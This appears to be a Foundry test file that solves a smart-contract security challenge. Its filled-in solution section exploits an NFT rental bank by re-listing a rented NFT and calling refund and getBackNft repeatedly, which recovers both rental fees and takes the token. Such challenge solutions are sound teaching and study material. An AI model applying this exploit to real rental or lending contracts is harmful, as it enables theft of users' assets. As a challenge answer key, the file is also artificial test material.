// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import {NFTBank} from "../src/NFTBank.sol";
import {ERC721} from "openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "openzeppelin-contracts/contracts/access/Ownable.sol";

contract CryptoKitties is ERC721("CryptoKitties", "MEOW"), Ownable {
    function mint(address to, uint id) external onlyOwner {
        _safeMint(to, id);
    }
}

contract NFTBankHack is Test {
    NFTBank bank;
    CryptoKitties meow;
    address nftOwner = makeAddr("nftOwner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(nftOwner);
        bank = new NFTBank();
        meow = new CryptoKitties();
        for (uint i; i < 10; i++) {
            meow.mint(nftOwner, i);
            meow.approve(address(bank), i);
            bank.addNFT(address(meow), i, 2 gwei, 500 gwei);
        }
        vm.stopPrank();
    }

    function test() public {
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        bank.rent{value: 500 gwei}(address(meow), 1);
        vm.warp(block.timestamp + 86400 * 10);
        //solution start

        //we add the NFT to the bank
        meow.approve(address(bank), 1);
        bank.addNFT(address(meow), 1, 0 gwei, 500 gwei);

        //now we rent it out again
        bank.rent{value: 500 gwei}(address(meow), 1);

        //we refund the NFT to get back the first 500 gwei
        meow.approve(address(bank), 1);
        bank.refund(address(meow), 1);

        //then we get it back as we are now marked as the owner
        bank.getBackNft(address(meow), 1, payable(address(attacker)));

        //then we refund it again to get the second 500 gwei
        meow.approve(address(bank), 1);
        bank.refund(address(meow), 1);

        //then we get it back again
        bank.getBackNft(address(meow), 1, payable(address(attacker)));

        //solution end  
        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
        assertEq(meow.ownerOf(1), attacker);
    }
}